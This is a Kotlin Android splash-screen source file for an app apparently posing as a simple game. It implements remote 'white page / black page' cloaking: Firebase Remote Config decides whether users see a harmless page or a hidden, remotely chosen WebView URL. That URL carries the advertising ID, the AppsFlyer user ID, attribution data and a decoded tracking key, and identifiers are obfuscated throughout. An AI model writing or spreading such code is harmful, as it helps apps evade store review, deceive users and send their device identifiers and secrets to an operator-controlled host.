package com.ker.win.joker.com

import android.animation.ObjectAnimator
import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.ker.win.joker.com.databinding.ActivitySplashZj4a7zmBinding
import com.ker.win.joker.com.ApplicationZJ4a7zm.*
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.APPSFLYER_UIDZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.GAIDZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.adGroupZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.adSet2ZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.afChannelZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.mediaSourceZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.pS1ZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.pS2ZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.pS3ZJ4a7zm
import com.ker.win.joker.com.ApplicationZJ4a7zm.Companion.statusZJ4a7zm
import com.ker.win.joker.com.MethodsZJ4a7zm.SharedPreferencesZJ4a7zm
import com.ker.win.joker.com.MethodsZJ4a7zm.decodeBase64ZJ4a7zm
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch


@SuppressLint("CustomSplashScreen")
class SplashActivityZJ4a7zm : AppCompatActivity() {

    private var firebaseWhiteKeyZJ4a7zm = "kerwinwhitepage"
    private var firebaseBlackKeyZJ4a7zm = "kerwinblackpage"
    private var firebaseDefaultKeyZJ4a7zm = "kerwindefoultkey"

    private var firebaseWhiteValueZJ4a7zm: String? = null
    private var firebaseBlackValueZJ4a7zm: String? = null
    private var firebaseDefaultKeyValueZJ4a7zm: String? = null

    private var urlForWebViewZJ4a7zm: String? = null

    private lateinit var bindingZJ4a7zm: ActivitySplashZj4a7zmBinding

    override fun onCreate(savedInstanceStateZJ4a7zm: Bundle?) {
        super.onCreate(savedInstanceStateZJ4a7zm)
        bindingZJ4a7zm = ActivitySplashZj4a7zmBinding.inflate(layoutInflater)
        setContentView(bindingZJ4a7zm.root)
        if (!SharedPreferencesZJ4a7zm.getLastPageZJ4a7zm(this).equals("null")) {
            startWebViewWithURLZJ4a7zm(SharedPreferencesZJ4a7zm.getLastPageZJ4a7zm(this)!!)
            finish()
        }
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(mapOf(
                firebaseBlackKeyZJ4a7zm to "empty"
            ))
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    firebaseBlackValueZJ4a7zm = getString(firebaseBlackKeyZJ4a7zm)
                    firebaseDefaultKeyValueZJ4a7zm = getString(firebaseDefaultKeyZJ4a7zm)
                    firebaseWhiteValueZJ4a7zm = getString(firebaseWhiteKeyZJ4a7zm)
                    Log.d("TEST_FB_URL" , firebaseWhiteValueZJ4a7zm ?: "mistake")
                    SharedPreferencesZJ4a7zm.putFirebaseDefaultKeyZJ4a7zm(
                        firebaseDefaultKeyValueZJ4a7zm!!, this@SplashActivityZJ4a7zm)
                }
            }
        }
        bindingZJ4a7zm.bSplashGoZj4a7zm.setOnClickListener {
            splashZJ4a7zm()
            CoroutineScope(Dispatchers.Main).launch {
                delay(5000)
                getURLForWebViewZJ4a7zm()
                startWebViewWithURLZJ4a7zm(urlForWebViewZJ4a7zm?: "")
            }
        }


    }

    private fun getURLForWebViewZJ4a7zm () {
        if (firebaseBlackValueZJ4a7zm != null &&
            !firebaseBlackValueZJ4a7zm.equals("empty")) {
            parseURLForBlackWebViewZJ4a7zm()
        } else {
            urlForWebViewZJ4a7zm = firebaseWhiteValueZJ4a7zm
        }
    }

    private fun parseURLForBlackWebViewZJ4a7zm () {
        Log.d("TEST_2_APPS", statusZJ4a7zm.toString())
        when (statusZJ4a7zm) {
            "Organic" -> {
                if (pS1ZJ4a7zm?.length == 20) {
                    urlForWebViewZJ4a7zm = Uri.parse(firebaseBlackValueZJ4a7zm).buildUpon()
                        .appendQueryParameter("key", pS1ZJ4a7zm)
                        .appendQueryParameter("bundle", packageName)
                        .appendQueryParameter("sub7", "Organic")
                        .toString()
                        .plus("&sub10=${APPSFLYER_UIDZJ4a7zm}||${GAIDZJ4a7zm}||${decodeBase64ZJ4a7zm(BuildConfig.APPS_FLYER_KEY)}")
                }
                else {
                    parseDefaultUrlZJ4a7zm()
                }
            }
            "Non-organic" -> {
                if (pS1ZJ4a7zm?.length == 20) {
                    urlForWebViewZJ4a7zm = Uri.parse(firebaseBlackValueZJ4a7zm).buildUpon()
                        .appendQueryParameter("key", pS1ZJ4a7zm)
                        .appendQueryParameter("bundle", packageName)
                        .appendQueryParameter("sub2", pS2ZJ4a7zm)
                        .appendQueryParameter("sub3", pS3ZJ4a7zm)
                        .appendQueryParameter("sub4", adGroupZJ4a7zm)
                        .appendQueryParameter("sub5", adSet2ZJ4a7zm)
                        .appendQueryParameter("sub6", afChannelZJ4a7zm)
                        .appendQueryParameter("sub7", mediaSourceZJ4a7zm)
                        .toString()
                        .plus("&sub10=${APPSFLYER_UIDZJ4a7zm}||${GAIDZJ4a7zm}||${decodeBase64ZJ4a7zm(BuildConfig.APPS_FLYER_KEY)}")
                    Log.d("TEST_1_URL",urlForWebViewZJ4a7zm.toString())
                } else {
                    parseDefaultUrlZJ4a7zm()
                }

            }
            else -> {
                if (pS1ZJ4a7zm?.length == 20) {
                    urlForWebViewZJ4a7zm = Uri.parse(firebaseBlackValueZJ4a7zm).buildUpon()
                        .appendQueryParameter("key", pS1ZJ4a7zm)
                        .appendQueryParameter("bundle", packageName)
                        .appendQueryParameter("sub7", "Organic")
                        .toString()
                        .plus("&sub10=${APPSFLYER_UIDZJ4a7zm}||${GAIDZJ4a7zm}||${decodeBase64ZJ4a7zm(BuildConfig.APPS_FLYER_KEY)}")
                }
                else {
                    parseDefaultUrlZJ4a7zm()
                }
            }
        }
    }

    private fun parseDefaultUrlZJ4a7zm () {
        urlForWebViewZJ4a7zm = Uri.parse(firebaseBlackValueZJ4a7zm).buildUpon()
            .appendQueryParameter("key",firebaseDefaultKeyValueZJ4a7zm)
            .appendQueryParameter("bundle",packageName)
            .appendQueryParameter("sub4", adGroupZJ4a7zm)
            .appendQueryParameter("sub5", adSet2ZJ4a7zm)
            .appendQueryParameter("sub6", afChannelZJ4a7zm)
            .appendQueryParameter("sub7","Default")
            .toString()
            .plus("&sub10=${APPSFLYER_UIDZJ4a7zm}||${GAIDZJ4a7zm}||${decodeBase64ZJ4a7zm(BuildConfig.APPS_FLYER_KEY)}")
        Log.d("TEST_1_URL", urlForWebViewZJ4a7zm.toString())
    }

    private fun startWebViewWithURLZJ4a7zm (url: String) {
        Intent(this, WebViewActivityZJ4a7zm::class.java).run {
            putExtra("webViewURL", url)
            startActivity(this)
            finish()
        }
    }

    private fun splashZJ4a7zm () {
        bindingZJ4a7zm.tvSplashLoadingZj4a7zm.visibility = View.VISIBLE
        bindingZJ4a7zm.pbSplashLoadingZj4a7zm.visibility = View.VISIBLE
        ObjectAnimator.ofFloat(bindingZJ4a7zm.ivCircleSplashZj4a7zm, View.SCALE_X, 1f , 35f).run {
            duration = 500
            start()
        }
        ObjectAnimator.ofFloat(bindingZJ4a7zm.ivCircleSplashZj4a7zm, View.SCALE_Y, 1f, 35f).run {
            duration = 500
            start()
        }
        ObjectAnimator.ofFloat(bindingZJ4a7zm.pbSplashLoadingZj4a7zm, View.TRANSLATION_Y, 0f, 200f).run {
            startDelay = 250
            duration = 500
            start()
        }
        ObjectAnimator.ofFloat(bindingZJ4a7zm.tvSplashLoadingZj4a7zm, View.TRANSLATION_Y, 0f, -200f).run {
            startDelay = 250
            duration = 500
            start()
        }
        ObjectAnimator.ofFloat(bindingZJ4a7zm.bSplashGoZj4a7zm, View.ALPHA, 1f, 0f).run {
            duration = 1000
            start()
        }
        ObjectAnimator.ofFloat(bindingZJ4a7zm.ivSplashGoZj4a7zm, View.ALPHA, 1f, 0f).run {
            duration = 1000
            start()
        }
    }
}